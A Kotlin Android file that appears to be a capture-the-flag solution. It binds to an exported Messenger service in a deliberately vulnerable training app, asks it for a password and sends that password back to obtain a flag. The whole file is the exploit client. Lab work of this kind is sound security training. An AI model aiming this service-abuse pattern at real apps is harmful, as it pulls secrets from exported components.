package com.example.myapplication

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.os.RemoteException
import android.util.Log

private const val MSG_ECHO = 1
private const val MSG_GET_PASSWORD = 2
private const val MSG_GET_FLAG = 3

class Flag27Client(private val context: Context) {

    private var serviceMessenger: Messenger? = null
    private var isBound = false
    private var receivedPassword: String? = null

    private val incomingHandler = object : Handler(Looper.getMainLooper()) {
        override fun handleMessage(msg: Message) {
            val data = msg.data
            Log.i("Flag27Client", "Got message what=${msg.what} data=$data")

            when (msg.what) {
                MSG_GET_PASSWORD -> {
                    val password = data?.getString("password")
                    if (password != null) {
                        receivedPassword = password
                        Log.i("Flag27Client", "Password received: $password")
                        sendGetFlag()
                    }
                    val reply = data?.getString("reply")
                    if (reply != null) {
                        Log.i("Flag27Client", "Reply: $reply")
                    }
                }
                MSG_GET_FLAG -> {
                    val reply = data?.getString("reply")
                    Log.i("Flag27Client", "Flag reply: $reply")
                }
                else -> {
                    val reply = data?.getString("reply")
                    Log.i("Flag27Client", "Reply: $reply")
                }
            }
        }
    }

    private val clientMessenger = Messenger(incomingHandler)

    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder) {
            serviceMessenger = Messenger(service)
            isBound = true
            Log.i("Flag27Client", "Connected to $name")
            sendEcho()
        }

        override fun onServiceDisconnected(name: ComponentName) {
            serviceMessenger = null
            isBound = false
        }
    }

    fun bind() {
        val intent = Intent().apply {
            setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag27Service"
            )
        }
        context.bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)
    }

    fun unbind() {
        if (isBound) {
            context.unbindService(serviceConnection)
            isBound = false
            serviceMessenger = null
        }
    }

    private fun sendEcho() {
        val messenger = serviceMessenger ?: return
        val bundle = Bundle().apply { putString("echo", "give flag") }
        val msg = Message.obtain(null, MSG_ECHO).apply {
            data = bundle
            replyTo = clientMessenger
        }
        try {
            messenger.send(msg)
            sendGetPassword()
        } catch (e: RemoteException) {
            Log.e("Flag27Client", "sendEcho failed", e)
        }
    }

    private fun sendGetPassword() {
        val messenger = serviceMessenger ?: return
        val msg = Message.obtain(null, MSG_GET_PASSWORD).apply {
            replyTo = clientMessenger
            obj = clientMessenger
        }
        try {
            messenger.send(msg)
        } catch (e: RemoteException) {
            Log.e("Flag27Client", "sendGetPassword failed", e)
        }
    }

    private fun sendGetFlag() {
        val messenger = serviceMessenger ?: return
        val password = receivedPassword ?: return
        val bundle = Bundle().apply { putString("password", password) }
        val msg = Message.obtain(null, MSG_GET_FLAG).apply {
            data = bundle
            replyTo = clientMessenger
        }
        try {
            messenger.send(msg)
        } catch (e: RemoteException) {
            Log.e("Flag27Client", "sendGetFlag failed", e)
        }
    }
}